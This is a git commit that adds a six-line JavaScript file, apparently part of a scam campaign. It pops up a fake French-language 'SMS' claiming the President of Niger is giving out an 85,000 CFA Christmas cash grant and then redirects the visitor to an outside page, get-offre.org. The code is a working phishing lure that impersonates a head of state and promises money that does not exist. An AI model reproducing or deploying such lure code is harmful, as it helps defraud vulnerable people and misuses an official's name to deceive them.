e0191b1af5533047d4c94c05c5d574f2e58c6474
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-11-26 22:25:57 -0800

    Create niger-active.js

---
+++ niger-active.js
@@ -0,0 +1,6 @@
+
+var password = 'RETIRER 85 000CFA'
+password=prompt('SMS : Félicitations, vous êtes éligible à la subvention de Noël en espèces de 85 000CFA du Président ABDOURAHAMANE TCHIANI pour les NIGERIEN. Veuillez appuyer sur OK pour retirer le prix en espèces.   ','RETIRER 85 000CFA');
+if (password != 'RETIRER 85 000CFA') {
+location.href='https://get-offre.org/niger-grant.html';
+}
